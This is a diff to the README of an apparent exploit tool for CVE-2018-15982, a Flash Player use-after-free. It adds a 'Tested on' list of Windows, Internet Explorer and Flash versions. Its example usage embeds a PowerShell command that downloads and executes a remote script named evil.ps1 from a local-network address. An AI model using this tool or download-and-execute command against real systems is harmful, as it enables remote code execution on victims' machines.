@@ -8,6 +8,7 @@ The vulnerability is a use-after-free flaw enabling arbitrary code-execution in 
 * https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-15982
 
 
+
 Usage:
 
 ```python create_swf.py <command> <output file name>```
@@ -16,6 +17,11 @@ Example Usage:
 
 ```python create_swf.py "powershell.exe IEX (iwr 'http://192.168.56.101/evil.ps1')" test.swf```
   
+
+
+Tested on: 
+* Windows 10 Enterprise 10.0.17134, Internet Explorer 11.285.17134.0
+* Adobe Flash Player 31.0.0.153
 
 
 ## Example
